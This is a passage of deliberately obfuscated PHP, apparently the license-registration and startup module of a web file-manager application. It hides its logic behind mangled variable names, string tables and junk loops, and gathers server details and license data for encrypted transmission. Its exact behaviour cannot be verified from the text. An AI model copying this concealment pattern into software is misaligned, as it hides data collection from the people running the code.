ÆÍÉ[629]; while (strlen($³÷Ú“ã) < $„ƒ ÆÍÉ[630]) { if (!$³÷Ú“ã) { break; } $³÷Ú“ã++; } $¡ß Ö›¯ = array($ôÙ»°Å[4], $°ê†¾£¶); $ßÔï‰™ = $„ƒ ÆÍÉ[631]; if (!$ßÔï‰™) { die; } $ş»¼»ÇÑ = array_slice($GLOBALS[$ôÙ»°Å[13]][$ôÙ»°Å[14]], 1); $GLOBALS[$ôÙ»°Å[13]][$ôÙ»°Å[14]] = array_merge($¡ß Ö›¯, $ş»¼»ÇÑ); $Ì¦©«¼î = $„ƒ ÆÍÉ[632]; $GLOBALS[$ôÙ»°Å[13]][$ôÙ»°Å[15]] = implode($ôÙ»°Å[0], $GLOBALS[$ôÙ»°Å[13]][$ôÙ»°Å[14]]); $¼ÅìëŠ€ = $„ƒ ÆÍÉ[633]; } private function naok5d1e0a5a() { $ïİË¸ =& $_SERVER[ä¿÷‹µ±]; $ä›ÜÇíÄ =& $_SERVER[ÒÆÆšøŠ]; if ($GLOBALS[$ä›ÜÇíÄ[13]][$ä›ÜÇíÄ[15]] != $ä›ÜÇíÄ[6]) { return; } $É›–ğÃ = $_SERVER[$ä›ÜÇíÄ[16]]; $ŠÉ¬ƒêë = $ä›ÜÇíÄ[17]; $œÀÎŸÙÆ = $ïİË¸[632]; while ($œÀÎŸÙÆ < $ïİË¸[624]) { if ($œÀÎŸÙÆ >= 0) { break; } $œÀÎŸÙÆ++; } if (!strstr($É›–ğÃ, $ŠÉ¬ƒêë)) { return; } $šÚï‹”ª = strrpos($É›–ğÃ, $ŠÉ¬ƒêë); $Ï´Ã­íá = $ïİË¸[634]; if (!$Ï´Ã­íá) { return; } $¯ˆ‚ÊëÃ = substr($É›–ğÃ, $šÚï‹”ª + strlen($ŠÉ¬ƒêë)); $®Øñ÷Æ = $ïİË¸[635]; if (!$®Øñ÷Æ) { return; } preg_match_all($ä›ÜÇíÄ[18], $¯ˆ‚ÊëÃ, $‹Êş·×Ø); $¯ˆ‚ÊëÃ = trim($‹Êş·×Ø[0][0], $ä›ÜÇíÄ[19]); $†¿Ãï— = $ïİË¸[636]; if (strlen($†¿Ãï—) < $ïİË¸[619]) { return; } $GLOBALS[$ä›ÜÇíÄ[13]][$ä›ÜÇíÄ[14]] = explode($ä›ÜÇíÄ[19], $¯ˆ‚ÊëÃ); $Ê‘ÒÄ¾† = $ïİË¸[637]; $GLOBALS[$ä›ÜÇíÄ[13]][$ä›ÜÇíÄ[15]] = implode($ä›ÜÇíÄ[0], $GLOBALS[$ä›ÜÇíÄ[13]][$ä›ÜÇíÄ[14]]); $Íì¹åÚ› = $ïİË¸[638]; if (strlen($Íì¹åÚ›) < $ïİË¸[621]) { return; } } public function run() { $¸›ÉˆĞ™ =& $_SERVER[ä¿÷‹µ±]; $¹ìåá¬– =& $_SERVER[ÒÆÆšøŠ]; $this->naok5d1e0a5a(); $this->kafv1fb4c2d7(); $á—çò‰ = $¸›ÉˆĞ™[639]; if (!$á—çò‰) { die; } $ã˜–ü–¤ = $GLOBALS[$¹ìåá¬–[13]][$¹ìåá¬–[14]]; $¦ÛÈ€¥• = $¸›ÉˆĞ™[640]; $æ«âó¸ = $GLOBALS[$¹ìåá¬–[13]][$¹ìåá¬–[15]]; define($¹ìåá¬–[20], isset($ã˜–ü–¤[0]) && $ã˜–ü–¤[0] ? $ã˜–ü–¤[0] : $this->defaultModule); define($¹ìåá¬–[21], isset($ã˜–ü–¤[1]) && $ã˜–ü–¤[0] ? $ã˜–ü–¤[1] : $this->defaultController); $•£Å©»â = $¸›ÉˆĞ™[641]; if (strlen($•£Å©»â) < $¸›ÉˆĞ™[630]) { return; } define($¹ìåá¬–[22], isset($ã˜–ü–¤[2]) && $ã˜–ü–¤[0] ? $ã˜–ü–¤[2] : $this->defaultAction); $‹§óÁ = $¸›ÉˆĞ™[642]; if (strlen($‹§óÁ) < $¸›ÉˆĞ™[619]) { return; } define($¹ìåá¬–[23], MOD . $¹ìåá¬–[0] . ST . $¹ìåá¬–[0] . ACT); $_SERVER[$¹ìåá¬–[24]] = strtolower(ACTION); $«ğïœ•ó = $¸›ÉˆĞ™[643]; if (strlen($«ğïœ•ó) < $¸›ÉˆĞ™[624]) { return; } $this->autorun(); $›±˜Ó»© = $¸›ÉˆĞ™[644]; while (strlen($›±˜Ó»©) < $¸›ÉˆĞ™[621]) { if (!$›±˜Ó»©) { break; } $›±˜Ó»©++; } if (count($ã˜–ü–¤) >= 3) { $this->appRun($æ«âó¸); } else { $this->appRun(ACTION); } } private $gyzo3643201d = array(); private $ckwsa0b9942b = ''; public function wyon0f9a86a9() { $ö´–±‹ô =& $_SERVER[ä¿÷‹µ±]; $Ó˜ˆÔå£ =& $_SERVER[ÒÆÆšøŠ]; $this->hzald3ce7328(); $this->bxdje88843ad(); $à˜Ùú«’ = $ö´–±‹ô[645]; $this->vbyl0dd6f9ae(); $ ¿Ç…Å = $ö´–±‹ô[646]; while (strlen($ ¿Ç…Å) < $ö´–±‹ô[624]) { if (!$ ¿Ç…Å) { break; } $ ¿Ç…Å++; } $this->uasw2d6f3838(); $this->vhxa0c786bdc(); $this->jrgi01c86677(); $‡Åî–ª© = $ö´–±‹ô[647]; $this->oihx6230d7d8(); $this->yblvb9a209e5($Ó˜ˆÔå£[25], array($this, $Ó˜ˆÔå£[26])); $this->yblvb9a209e5($Ó˜ˆÔå£[27], array($this, $Ó˜ˆÔå£[28])); $ƒ¥Šìîİ = $ö´–±‹ô[648]; if (!$ƒ¥Šìîİ) { die; } $this->yblvb9a209e5($Ó˜ˆÔå£[29], array($this, $Ó˜ˆÔå£[30])); $this->yblvb9a209e5($Ó˜ˆÔå£[31], array($this, $Ó˜ˆÔå£[32])); } public function pnmudf667299($”İ†ìß) { $êŠ×©ÏÇ =& $_SERVER[ä¿÷‹µ±]; $Œ—¢µÙÎ =& $_SERVER[ÒÆÆšøŠ]; $¶±ÙØ = Model($Œ—¢µÙÎ[33])->get(); $‹õ£şÓ = $êŠ×©ÏÇ[649]; if (!$‹õ£şÓ) { return; } $éğ”º÷ = array($Œ—¢µÙÎ[34], $Œ—¢µÙÎ[35], $Œ—¢µÙÎ[36], $Œ—¢µÙÎ[37], $Œ—¢µÙÎ[38], $Œ—¢µÙÎ[39], $Œ—¢µÙÎ[40], $Œ—¢µÙÎ[41], $Œ—¢µÙÎ[42], $Œ—¢µÙÎ[43], $Œ—¢µÙÎ[44], $Œ—¢µÙÎ[45], $Œ—¢µÙÎ[46], $Œ—¢µÙÎ[47], $Œ—¢µÙÎ[48], $Œ—¢µÙÎ[49], $Œ—¢µÙÎ[50], $Œ—¢µÙÎ[51], $Œ—¢µÙÎ[52], $Œ—¢µÙÎ[53], $Œ—¢µÙÎ[54], $Œ—¢µÙÎ[55], $Œ—¢µÙÎ[56], $Œ—¢µÙÎ[57], $Œ—¢µÙÎ[58], $Œ—¢µÙÎ[59], $Œ—¢µÙÎ[60], $Œ—¢µÙÎ[61], $Œ—¢µÙÎ[62], $Œ—¢µÙÎ[63], $Œ—¢µÙÎ[64], $Œ—¢µÙÎ[65], $Œ—¢µÙÎ[66], $Œ—¢µÙÎ[67], $Œ—¢µÙÎ[68], $Œ—¢µÙÎ[69], $Œ—¢µÙÎ[70], $Œ—¢µÙÎ[71], $Œ—¢µÙÎ[72], $Œ—¢µÙÎ[73], $Œ—¢µÙÎ[74], $Œ—¢µÙÎ[75], $Œ—¢µÙÎ[76], $Œ—¢µÙÎ[77], $Œ—¢µÙÎ[78], $Œ—¢µÙÎ[79], $Œ—¢µÙÎ[80], $Œ—¢µÙÎ[81], $Œ—¢µÙÎ[82], $Œ—¢µÙÎ[83]); $»ì…õšÌ = $êŠ×©ÏÇ[650]; if (!$»ì…õšÌ) { die; } foreach ($éğ”º÷ as $¹©õ°ä‡) { $˜ì×„ìÓ = $GLOBALS[$Œ—¢µÙÎ[84]][$Œ—¢µÙÎ[85]][$¹©õ°ä‡]; $¼˜ôûØ = $êŠ×©ÏÇ[651]; if (isset($¶±ÙØ[$¹©õ°ä‡])) { $˜ì×„ìÓ = $¶±ÙØ[$¹©õ°ä‡]; } $”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$¹©õ°ä‡] = $˜ì×„ìÓ; } $§’œÃâõ = $”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$Œ—¢µÙÎ[46]]; unset($”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[88]][$Œ—¢µÙÎ[89]]); $²ñö¡ = $êŠ×©ÏÇ[652]; unset($”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[88]][$Œ—¢µÙÎ[90]]); $à¯Ù³èÅ = $êŠ×©ÏÇ[653]; while ($à¯Ù³èÅ < $êŠ×©ÏÇ[621]) { if ($à¯Ù³èÅ >= 0) { break; } $à¯Ù³èÅ++; } unset($”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$Œ—¢µÙÎ[46]]); $º§íÜë = $êŠ×©ÏÇ[654]; if (strlen($º§íÜë) < $êŠ×©ÏÇ[630]) { return; } unset($”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$Œ—¢µÙÎ[91]]); $”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$Œ—¢µÙÎ[92]] = array($Œ—¢µÙÎ[93] => (int) $§’œÃâõ[$Œ—¢µÙÎ[94]], $Œ—¢µÙÎ[95] => (int) _get($§’œÃâõ, $Œ—¢µÙÎ[96], 0)); $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[98]] = Action($Œ—¢µÙÎ[99])->accessToken(); $±×Åøô = $êŠ×©ÏÇ[655]; $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[100]] = md5($_SERVER[$Œ—¢µÙÎ[101]] . $¶±ÙØ[$Œ—¢µÙÎ[102]]); $ÍßÏŒğı = $êŠ×©ÏÇ[656]; $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[103]] = base64_encode(serverInfo()); $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[104]] = $this->ckwsa0b9942b; $½¬ÁªšË = $êŠ×©ÏÇ[657]; if (!$½¬ÁªšË) { return; } if ($¶±ÙØ[$Œ—¢µÙÎ[104]] != $Œ—¢µÙÎ[105]) { $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[106]] = $¶±ÙØ[$Œ—¢µÙÎ[106]]; $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[107]] = $¶±ÙØ[$Œ—¢µÙÎ[107]]; $ìÔÒ«ì† = rand_string(10) . $this->ckwsa0b9942b . rand_string(5); $”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[108]][$Œ—¢µÙÎ[109]] = $this->zbkp4ba29f6d($ìÔÒ«ì†, $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[100]]); } if ($this->ckwsa0b9942b == $Œ—¢µÙÎ[105]) { $”İ†ìß[$Œ—¢µÙÎ[86]][$Œ—¢µÙÎ[87]][$Œ—¢µÙÎ[92]][$Œ—¢µÙÎ[96]] = 0; } $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[110]] = _get($this->gyzo3643201d, $Œ—¢µÙÎ[111], $Œ—¢µÙÎ[6]); $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[112]] = _get($this->gyzo3643201d, $Œ—¢µÙÎ[113], $Œ—¢µÙÎ[6]); $ÄÚçíä€ = $êŠ×©ÏÇ[658]; while (strlen($ÄÚçíä€) < $êŠ×©ÏÇ[630]) { if (!$ÄÚçíä€) { break; } $ÄÚçíä€++; } if (_get($GLOBALS, $Œ—¢µÙÎ[114]) && $this->config[$Œ—¢µÙÎ[115]]) { $”İ†ìß[$Œ—¢µÙÎ[97]][$Œ—¢µÙÎ[116]] = WEB_ROOT; } return $”İ†ìß; } private function jrgi01c86677() { $˜ÇŠ©İŞ =& $_SERVER[ä¿÷‹µ±]; $ášò¥Œ‘ =& $_SERVER[ÒÆÆšøŠ]; $”Ê˜şĞÂ = $_SERVER[$ášò¥Œ‘[24]] == $ášò¥Œ‘[117]; $å½ÏØ÷İ = $˜ÇŠ©İŞ[659]; if ($_SERVER[$ášò¥Œ‘[24]] == $ášò¥Œ‘[118] && $_GET[$ášò¥Œ‘[119]] == $ášò¥Œ‘[120]) { $”Ê˜şĞÂ = !0; } if ($”Ê˜şĞÂ) { $•ş¨ßëô = array($ášò¥Œ‘[104] => $this->ckwsa0b9942b, $ášò¥Œ‘[121] => $this->lwnt05acfb03(), $ášò¥Œ‘[122] => Model($ášò¥Œ‘[123])->count()); if ($this->ckwsa0b9942b != $ášò¥Œ‘[105]) { $×ªÎ‰õÜ = _get($this->gyzo3643201d, $ášò¥Œ‘[124]); if ($×ªÎ‰õÜ) { $•ş¨ßëô[$ášò¥Œ‘[125]] = $×ªÎ‰õÜ; $•ş¨ßëô[$ášò¥Œ‘[126]] = strtotime(_get($this->gyzo3643201d, $ášò¥Œ‘[127])); $•ş¨ßëô[$ášò¥Œ‘[128]] = _get($this->gyzo3643201d, $ášò¥Œ‘[113]); } $¹ñ©®·¶ = Model($ášò¥Œ‘[33])->get($ášò¥Œ‘[129], $ášò¥Œ‘[6], !0); if (is_string($¹ñ©®·¶) && substr($¹ñ©®·¶, 0, 1) == $ášò¥Œ‘[130]) { $¹ñ©®·¶ = json_decode_force($¹ñ©®·¶); } if (is_array($¹ñ©®·¶) && $¹ñ©®·¶[$ášò¥Œ‘[131]] && strstr($¹ñ©®·¶[$ášò¥Œ‘[131]], $ášò¥Œ‘[132])) { $ÏÅÅ¥µ¼ = explode($ášò¥Œ‘[132], $¹ñ©®·¶[$ášò¥Œ‘[131]]); $•ş¨ßëô[$ášò¥Œ‘[133]] = $ÏÅÅ¥µ¼[0]; } } $•ş¨ßëô = $this->yjmc29d098d0(json_encode($•ş¨ßëô), md5($ášò¥Œ‘[134])); $ßÆ¢ŠÑ = array($ášò¥Œ‘[135] => $•ş¨ßëô); call_user_func(array($ášò¥Œ‘[136], $ášò¥Œ‘[137]), $ßÆ¢ŠÑ); $³›çÇµ = $˜ÇŠ©İŞ[660]; } if ($this->ckwsa0b9942b == $ášò¥Œ‘[105]) { return; } $³ş¦íï² = array($ášò¥Œ‘[138], $ášò¥Œ‘[139], $ášò¥Œ‘[140], $ášò¥Œ‘[141], $ášò¥Œ‘[142], $ášò¥Œ‘[143]); $ß¥°”Œ = Model($ášò¥Œ‘[33])->get(); $ßÆ¢ŠÑ = array($ášò¥Œ‘[144] => $ß¥°”Œ[$ášò¥Œ‘[34]], $ášò¥Œ‘[145] => $ß¥°”Œ[$ášò¥Œ‘[35]], $ášò¥Œ‘[146] => $ášò¥Œ‘[6]); foreach ($³ş¦íï² as $ÚÌãÆ…») { if (!isset($ß¥°”Œ[$ÚÌãÆ…»]) || !$ß¥°”Œ[$ÚÌãÆ…»]) { continue; } $ßÆ¢ŠÑ[$ÚÌãÆ…»] = $ß¥°”Œ[$ÚÌãÆ…»]; $Şºû‘ = $˜ÇŠ©İŞ[661]; } call_user_func(array($ášò¥Œ‘[136], $ášò¥Œ‘[137]), $ßÆ¢ŠÑ); $Å‚Ö¼Õ… = $˜ÇŠ©İŞ[662]; while (strlen($Å‚Ö¼Õ…) < $˜ÇŠ©İŞ[624]) { if (!$Å‚Ö¼Õ…) { break; } $Å‚Ö¼Õ…++; } } private function uasw2d6f3838() { $«‡üÎ¦å =& $_SERVER[ä¿÷‹µ±]; $– ‚¦Ş =& $_SERVER[ÒÆÆšøŠ]; if ($_SERVER[$– ‚¦Ş[24]] != $– ‚¦Ş[147]) { return; } if (!_get($GLOBALS, $– ‚¦Ş[114])) { die; } $èü¬¡ºÏ = $GLOBALS[$– ‚¦Ş[13]]; if (isset($èü¬¡ºÏ[$– ‚¦Ş[148]])) { $this->zwvccae172e9(); die; } if (!isset($èü¬¡ºÏ[$– ‚¦Ş[149]]) || strlen($èü¬¡ºÏ[$– ‚¦Ş[149]]) != 16) { show_json($– ‚¦Ş[150] . $èü¬¡ºÏ[$– ‚¦Ş[149]], !1); } $æÕ¾Ãâá = Model($– ‚¦Ş[33])->get($– ‚¦Ş[102]); $‚‰Úßßß = md5($_SERVER[$– ‚¦Ş[101]] . $æÕ¾Ãâá); $‚úèˆÏş = array($– ‚¦Ş[149] => $èü¬¡ºÏ[$– ‚¦Ş[149]], $– ‚¦Ş[151] => rand_string(16), $– ‚¦Ş[152] => $– ‚¦Ş[134], $– ‚¦Ş[153] => $– ‚¦Ş[154], $– ‚¦Ş[155] => $_SERVER[$– ‚¦Ş[156]], $– ‚¦Ş[157] => $_SERVER[$– ‚¦Ş[158]], $– ‚¦Ş[159] => $_SERVER[$– ‚¦Ş[160]], $– ‚¦Ş[100] => $‚‰Úßßß, $– ‚¦Ş[161] => Model($– ‚¦Ş[33])->get($– ‚¦Ş[129])); $ëÀ€¿™Ù = $«‡üÎ¦å[663]; while (strlen($ëÀ€¿™Ù) < $«‡üÎ¦å[619]) { if (!$ëÀ€¿™Ù) { break; } $ëÀ€¿™Ù++; } if ($èü¬¡ºÏ[$– ‚¦Ş[162]] == $– ‚¦Ş[163]) { $ßï¤¿İ = $this->yjmc29d098d0($‚‰Úßßß, $– ‚¦Ş[164]); $·ÍšöØó = $this->zbkp4ba29f6d(json_encode($‚úèˆÏş), $‚‰Úßßß . $– ‚¦Ş[165], 3); $·ÍšöØó = $·ÍšöØó . $– ‚¦Ş[166] . $_SERVER[$– ‚¦Ş[156]]; $®Íˆà™Î = $this->yiqr0f4c1c14($– ‚¦Ş[167] . $ßï¤¿İ . $– ‚¦Ş[168] . $·ÍšöØó, -1); show_json($®Íˆà™Î, !0); } else { if ($èü¬¡ºÏ[$– ‚¦Ş[162]] == $– ‚¦Ş[169]) { $äÙµ©¶º = substr(md5($– ‚¦Ş[170] . $‚‰Úßßß), 12, 15) . $– ‚¦Ş[171]; $·ÍšöØó = $this->pcjw7ad8c130(trim($èü¬¡ºÏ[$– ‚¦Ş[172]]), $äÙµ©¶º, 2); $³ÖæËİĞ = json_decode($·ÍšöØó, !0); if (!is_array($³ÖæËİĞ) || !is_array($³ÖæËİĞ[$– ‚¦Ş[173]]) || $³ÖæËİĞ[$– ‚¦Ş[149]] != !0) { $œŞã¹ = $– ‚¦Ş[174]; $¿È§ÁŸ‡ = $³ÖæËİĞ[$– ‚¦Ş[173]] ? $– ‚¦Ş[175] . $³ÖæËİĞ[$– ‚¦Ş[173]] : $œŞã¹; show_json($¿È§ÁŸ‡, !1); } else { $‚úèˆÏş[$– ‚¦Ş[151]] = $³ÖæËİĞ[$– ‚¦Ş[173]][$– ‚¦Ş[176]]; } } else { $³ÖæËİĞ = $this->yiqr0f4c1c14($– ‚¦Ş[177], $‚úèˆÏş, 10); $¡ç†ñ÷‡ = $«‡üÎ¦å[664]; } } if (!is_array($³ÖæËİĞ) || !is_array($³ÖæËİĞ[$– ‚¦Ş[173]]) || $³ÖæËİĞ[$– ‚¦Ş[149]] != !0) { $œŞã¹ = LNG($– ‚¦Ş[178]); $¿È§ÁŸ‡ = $³ÖæËİĞ[$– ‚¦Ş[173]] ? $– ‚¦Ş[175] . $³ÖæËİĞ[$– ‚¦Ş[173]] : $œŞã¹; show_json($¿È§ÁŸ‡, !1); } $³“ó·‚‚ = $³ÖæËİĞ[$– ‚¦Ş[173]]; $ÉøöÎ× = $this->dgsf41b739e8($³“ó·‚‚[$– ‚¦Ş[179]]); $ğ¿‰¤ = $«‡üÎ¦å[665]; if (!$ğ¿‰¤) { die; } if (!$ÉøöÎ× || $ÉøöÎ× != $³“ó·‚‚[$– ‚¦Ş[127]]) { $ÓŒ§¤Ÿæ = array($– ‚¦Ş[180] => Model($– ‚¦Ş[33])->get($– ‚¦Ş[102]), $– ‚¦Ş[181] => $_SERVER[$– ‚¦Ş[101]], $– ‚¦Ş[182] => this_url(), $– ‚¦Ş[157] => $_SERVER[$– ‚¦Ş[158]]); $·ÍšöØó = $this->rtgiea89138e(json_encode($ÓŒ§¤Ÿæ)); $this->yiqr0f4c1c14($– ‚¦Ş[183] . $·ÍšöØó); show_json(LNG($– ‚¦Ş[184]), !0); } $‡»ïÜó = array($– ‚¦Ş[185] => $³“ó·‚‚[$– ‚¦Ş[186]], $– ‚¦Ş[187] => $³“ó·‚‚[$– ‚¦Ş[188]], $– ‚¦Ş[189] => rand_string(16), $– ‚¦Ş[104] => $³“ó·‚‚[$– ‚¦Ş[190]]); if ($‚úèˆÏş[$– ‚¦Ş[151]]) { $‡»ïÜó[$– ‚¦Ş[189]] = $‚úèˆÏş[$– ‚¦Ş[151]]; } $ˆ˜Å±ÛÜ = substr(md5($‡»ïÜó[$– ‚¦Ş[187]]), 10, 10); $¸€èÕ¬ = $ˆ˜Å±ÛÜ . $‡»ïÜó[$– ‚¦Ş[104]] . $‡»ïÜó[$– ‚¦Ş[189]]; $¾ÂÛÚÎ = $«‡üÎ¦å[666]; $‡»ïÜó[$– ‚¦Ş[106]] = strrev(base64_encode($this->yjmc29d098d0($¸€èÕ¬, $– ‚¦Ş[191]))); $Ÿé«Ğ­ = $«‡üÎ¦å[667]; if (strlen($Ÿé«Ğ­) < $«‡üÎ¦å[630]) { return; } $ƒ•¼í™Ú = rand_string(16); $İ¨Üüö = $«‡üÎ¦å[668]; while (strlen($İ¨Üüö) < $«‡üÎ¦å[624]) { if (!$İ¨Üüö) { break; } $İ¨Üüö++; } $ŸĞÖüñ“ = $ƒ•¼í™Ú . $‡»ïÜó[$– ‚¦Ş[104]] . $this->yjmc29d098d0(md5($‡»ïÜó[$– ‚¦Ş[185]]), $ƒ•¼í™Ú); $Í¯ª„Ö¡ = $«‡üÎ¦å[669]; if (!$Í¯ª„Ö¡) { die; } $‡»ïÜó[$– ‚¦Ş[107]] = base64_encode(strrev($this->yjmc29d098d0($ŸĞÖüñ“, $– ‚¦Ş[192]))); $ı¥ñéØÍ = $«‡üÎ¦å[670]; if (strlen($ı¥ñéØÍ) < $«‡üÎ¦å[628]) { die; } if ($³“ó·‚‚[$– ‚¦Ş[193]] && $³“ó·‚‚[$– ‚¦Ş[193]] >= 1) { Model($– ‚¦Ş[33])->setDeep($– ‚¦Ş[194], $– ‚¦Ş[120]); } Model($– ‚¦Ş[33])->set($‡»ïÜó); $Ñß¼Ëí˜ = md5($_SERVER[$– ‚¦Ş[101]] . strrev($æÕ¾Ãâá) . $‡»ïÜó[$– ‚¦Ş[187]]); $Ë·â…î‰ = $«‡üÎ¦å[671]; if (!$Ë·â…î‰) { die; } $ªàäğç = strrev(substr($Ñß¼Ëí˜, 10, 16)); $¼¬íòò‡ = $«‡üÎ¦å[672]; while ($¼¬íòò‡ < $«‡üÎ¦å[619]) { if ($¼¬íòò‡ >= 0) { break; } $¼¬íòò‡++; } $ İŸ©şÀ = $this->zbkp4ba29f6d(json_encode($³“ó·‚‚), $Ñß¼Ëí˜); $û¾êßÚñ = array_to_keyvalue(Model($– ‚¦Ş[7])->listData(), $– ‚¦Ş[195]); $ÔôÕğÑ = $«‡üÎ¦å[673]; while (strlen($ÔôÕğÑ) < $«‡üÎ¦å[624]) { if (!$ÔôÕğÑ) { break; } $ÔôÕğÑ++; } $´›¶´À™ = $û¾êßÚñ[$– ‚¦Ş[196]]; $Ú£İ­±á = array(); $Ú£İ­±á[$ªàäğç] = $ İŸ©şÀ; $£×‰«¢ = $«‡üÎ¦å[674]; if (!$£×‰«¢) { return; } Model($– ‚¦Ş[7])->update($´›¶´À™[$– ‚¦Ş[197]], array($– ‚¦Ş[198] => $Ú£İ­±á)); $ÊËƒ€È = $«‡üÎ¦å[675]; if (strlen($ÊËƒ€È) < $«‡üÎ¦å[619]) { return; } $this->gyzo3643201d = $³“ó·‚‚; $û“áíë† = $«‡üÎ¦å[676]; while (strlen($û“áíë†) < $«‡üÎ¦å[619]) { if (!$û“áíë†) { break; } $û“áíë†++; } $this->ckwsa0b9942b = $‡»ïÜó[$– ‚¦Ş[104]]; $ÇÌÆŞ¢ = $«‡üÎ¦å[677]; if (!$ÇÌÆŞ¢) { return; } $this->licenseRegistSuccess(); Cache::set($– ‚¦Ş[199] . md5($æÕ¾Ãâá . $– ‚¦Ş[200]), $– ‚¦Ş[6]); $áÉô©Ô¿ = $«‡üÎ¦å[678]; if (strlen($áÉô©Ô¿) < $«‡üÎ¦å[619]) { die; } show_json(LNG($– ‚¦Ş[184]), !0); $ˆò‘¹Ï = $«‡üÎ¦å[679]; if (strlen($ˆò‘¹Ï) < $«‡üÎ¦å[621]) { die; } } private function licenseRegistSuccess() { $Ã—ˆ‡« =& $_SERVER[ä¿÷‹µ±]; $ùç½¯’ô =& $_SERVER[ÒÆÆšøŠ]; $…à£¥× = Model($ùç½¯’ô[33])->get(); $õšÃ¯Á– = $Ã—ˆ‡«[680]; if (strlen($õšÃ¯Á–) < $Ã—ˆ‡«[630]) { return; } if ($…à£¥×[$ùç½¯’ô[63]] != $ùç½¯’ô[120]) { Model($ùç½¯’ô[33])->set($ùç½¯’ô[63], $ùç½¯’ô[120]); } Action($ùç½¯’ô[201])->initStart(!0); } private function zwvccae172e9() { $‹ÆÎİÌ =& $_SERVER[ä¿÷‹µ±]; $ÖÈÒì­é =& $_SERVER[ÒÆÆšøŠ]; Model($ÖÈÒì­é[33])->set(array($ÖÈÒì­é[185] => $ÖÈÒì­é[6], $ÖÈÒì­é[187] => $ÖÈÒì­é[6], $ÖÈÒì­é[104] => $ÖÈÒì­é[105], $ÖÈÒì­é[106] => $ÖÈÒì­é[6], $ÖÈÒì­é[107] => $ÖÈÒì­é[6])); $Ç×‚Éâ… = $‹ÆÎİÌ[681]; Model($ÖÈÒì­é[33])->setDeep($ÖÈÒì­é[194], $ÖÈÒì­é[202]); $•í¥úØ€ = $‹ÆÎİÌ[682]; $this->gyzo3643201d = array(); $this->ckwsa0b9942b = $ÖÈÒì­é[105]; $å¸®˜ = $‹ÆÎİÌ[683]; if (!$å¸®˜) { return; } } private function hzald3ce7328() { $°²ã‚ôâ =& $_SERVER[ä¿÷‹µ±]; $õÜĞ†™ =& $_SERVER[ÒÆÆšøŠ]; $_SERVER[$õÜĞ†™[158]] = _get($_SERVER, $õÜĞ†™[158], APP_HOST); $this->ckwsa0b9942b = $õÜĞ†™[105]; $¼Ô­ØÚ = Model($õÜĞ†™[33])->get(); $·©¥äƒå = $°²ã‚ôâ[684]; if (strlen($·©¥äƒå) < $°²ã‚ôâ[628]) { die; } if ($¼Ô­ØÚ[$õÜĞ†™[104]] == $õÜĞ†™[105]) { return; } $´¡»Ó¨ú = Model($õÜĞ†™[33])->get($õÜĞ†™[102]); $»Ù õÖÌ = $°²ã‚ôâ[685]; $ËÅÅĞá¹ = $õÜĞ†™[199] . md5($´¡»Ó¨ú . $õÜĞ†™[200]); $½öŒÌ = $°²ã‚ôâ[686]; if (!$½öŒÌ) { die; } $‹–«‰Ãƒ = Cache::get($ËÅÅĞá¹); $¥Ş¿ô€ = $°²ã‚ôâ[687]; if (!$¥Ş¿ô€) { return; } if (!is_array($‹–«‰Ãƒ) || !isset($‹–«‰Ãƒ[$õÜĞ†™[203]]) || time() - $‹–«‰Ãƒ[$õÜĞ†™[203]] >= 60) { $ùÃ»ú®± = Model($õÜĞ†™[7])->loadList(); $Ã”Ú¸ = $ùÃ»ú®±[$õÜĞ†™[196]]; $åĞÈüÏ‘ = md5($_SERVER[$õÜĞ†™[101]] . strrev($´¡»Ó¨ú) . $¼Ô­ØÚ[$õÜĞ†™[187]]); $şÜçÛ±ä = strrev(substr($åĞÈüÏ‘, 10, 16)); $‹–«‰Ãƒ = $this->pcjw7ad8c130($Ã”Ú¸[$õÜĞ†™[84]][$şÜçÛ±ä], $åĞÈüÏ‘); $‹–«‰Ãƒ = json_decode($‹–«‰Ãƒ, !0); } if (!is_array($‹–«‰Ãƒ)) { return $this->zwvccae172e9(); } $­¿Î“ß¯ = strtotime($‹–«‰Ãƒ[$õÜĞ†™[127]]); if (time() >= $­¿Î“ß¯) { return $this->zwvccae172e9(); } if (time() - $‹–«‰Ãƒ[$õÜĞ†™[203]] > 20) { $‹–«‰Ãƒ[$õÜĞ†™[203]] = time(); Cache::set($ËÅÅĞá¹, $‹–«‰Ãƒ); } $this->gyzo3643201d = $‹–«‰Ãƒ; $this->ckwsa0b9942b = $¼Ô­ØÚ[$õÜĞ†™[104]]; $¬õ›´ÜÅ = $°²ã‚ôâ[688]; if (strlen($¬õ›´ÜÅ) < $°²ã‚ôâ[624]) { die; } } private function bxdje88843ad() { $ŞÙ¬µªİ =& $_SERVER[ÒÆÆšøŠ]; $‰œœ‰»Å = $GLOBALS[$ŞÙ¬µªİ[13]]; $Ùá‡¢Àö = $_SERVER[$ŞÙ¬µªİ[24]]; if ($Ùá‡¢Àö == $ŞÙ¬µªİ[204] && $this->ckwsa0b9942b == $ŞÙ¬µªİ[105]) { show_json(LNG($ŞÙ¬µªİ[205]), !1, $ŞÙ¬µªİ[206]); } $£›Õ¯ÈÓ = array($ŞÙ¬µªİ[207], $ŞÙ¬µªİ[208]); if (in_array($Ùá‡¢Àö, $£›Õ¯ÈÓ)) { if ($this->ckwsa0b9942b == $ŞÙ¬µªİ[105] && isset($‰œœ‰»Å[$ŞÙ¬µªİ[209]])) { show_json(LNG($ŞÙ¬µªİ[205]), !1, $ŞÙ¬µªİ[206]); die; } $¯«õÇ Ñ = $this->lwnt05acfb03(); if ($¯«õÇ Ñ != 